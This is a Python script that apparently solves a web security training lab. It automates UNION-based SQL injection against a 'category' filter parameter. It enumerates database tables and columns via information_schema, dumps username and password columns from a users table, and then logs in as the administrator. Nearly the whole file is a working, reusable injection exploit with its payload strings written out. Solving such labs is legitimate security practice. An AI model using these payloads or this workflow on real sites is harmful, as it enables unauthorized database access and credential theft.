"""
For this lab, we need to determine the table that contains the username and table of the administrator user and login with it.
"""

import requests
from urllib.parse import quote
from proxies import proxies
from sqli_utils import *

def find(l, s):
    for i in range(len(l)):
        if l[i].find(s)!=-1:
            return i
    return 0

def enumerate_all_tables(session, url): 
    res = session.get(url + "/filter?category=' union select table_name, null from information_schema.tables -- ", verify=False, proxies=proxies)
    if res.status_code == 504:
        print("[!] Error 504: Session Timeout")
        return []
    elif res.status_code == 500:
        print("[!] Error 500: Invalid SQLi")
        return []

    return re.findall("<th>(.*)</th>", res.text)

def enumerate_all_columns_from_(session, url, table_name):
    res = session.get(url + "/filter?category=' union select column_name, null from information_schema.columns where table_name = '{}' -- ".format(table_name), verify=False, proxies=proxies)
    if res.status_code == 504:
        print("[!] Error 504: Session Timeout")
        return []
    elif res.status_code == 500:
        print("[!] Error 500: Invalid SQLi")
        return []

    return re.findall("<th>(.*)</th>", res.text)

def enumerate_table_content(session, url, table_name, username_field, password_field):
    res = session.get(url + '/filter?category=' + "' union select {0}, {1} from {2} --".format(username_field, password_field, table_name), verify=False, proxies=proxies)
    if res.status_code == 504:
        print("[!] Error 504: Session Timeout")
        return []
    elif res.status_code == 500:
        print("[!] Error 500: Invalid SQLi")
        return []

    usernames = re.findall("<th>(.*)</th>", res.text)
    passwords = re.findall("<td>(.*)</td>", res.text)
    
    return [usernames, passwords]


def solve(url: str, payload: str):
    r = requests.session()

    # First lets enumerate all the tables:
    table_names = enumerate_all_tables(r, url)
    possible_user_tables = []
    
    # Then enumerate all columns from said column
    for table in table_names:
        if 'users' in table:
            print("[+] Possible user table found: {}".format(table))
            column_names = enumerate_all_columns_from_(r, url, table)
            possible_credentials = []
            for column in column_names:
                if 'username' in column:
                    possible_credentials.append(column)
                    print("[+] Possible username column found: {0} at table {1}".format(column, table))

                if 'password' in column:
                    possible_credentials.append(column)
                    print("[+] Possible password column found: {0} at table {1}".format(column, table))

            possible_user_tables.append((table, possible_credentials))

    # Test the found tables:
    print("[~] Enumerating possible users tables:")
    for itr in possible_user_tables:
        if len(itr[1]) <= 1:
            return False
        for i in range(0, len(itr[1]) - 1):
            for j in range(i + 1, len(itr[1])):
                print("[~] Enumerating table {}".format(itr[0]))
                print("[~] Testing with possible username column: {0} and password column: {1}".format(itr[1][i], itr[1][j]))
                table_content = enumerate_table_content(r, url, itr[0], itr[1][i], itr[1][j])
                if 'administrator' in table_content[0]:
                    payload = {
                        "username": "administrator",
                        "password": table_content[1][find(table_content[0], 'administrator')]
                    }
                    print("[+] Possible administrator user found in table {0}".format(itr[0]))
                    print("[~] Testing login with password: {}".format(payload["password"]))
                    res = login_with_username_password(r, url, payload)

                    if "Congratulations, you solved the lab!" in res.text:
                        print("[+] ================================")
                        return True  

    return False